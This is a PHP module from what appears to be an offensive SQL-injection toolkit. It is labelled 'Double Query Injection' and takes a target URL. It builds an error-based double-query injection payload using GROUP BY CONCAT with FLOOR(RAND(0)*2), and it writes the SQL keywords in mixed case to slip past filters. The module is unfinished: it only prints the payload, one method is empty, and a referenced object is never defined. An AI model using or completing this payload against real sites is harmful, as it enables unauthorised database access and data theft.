<?php
	 	 
namespace sqlCore;
use \Framework as Framework;
	
class doubleQuery extends Framework {
		 
	protected $framework, $name, $description;

  	public function __construct($framework)
	{
		$this->framework = $framework;
		$this->name = "Double Query Injection";
		$this->description = "Performs Double Query Injection Against the Target";
		$this->base_path = $this->framework->base;
		$this->defaultVariables = array(
		'target' => array('required' => true, 'description' => ' ', 'match' => self::regexURL)
		);
		$this->modType = null;
	}
	     
	public function ordoubleQuery() {
		echo $this->framework->libs['colours']->cstring("\nTest String\n\n", "blue");
		$zmark = rand();
		$mark = bin2hex($zmark);
		$mark2 = $zmark;
		$query = "test";
		$base = "oR 1 GrOUp bY cONcAt(".$mark.",".$query.",".$mark.",FlOoR(RaNd(0)*2)) HaVIng MiN(0) oR 1".$this->sqli['sqli']->delim."\n";
		echo $base; 
		 
	}
	
	protected function anddoubleQuery() {
		 
		 
	}
     
}

?>
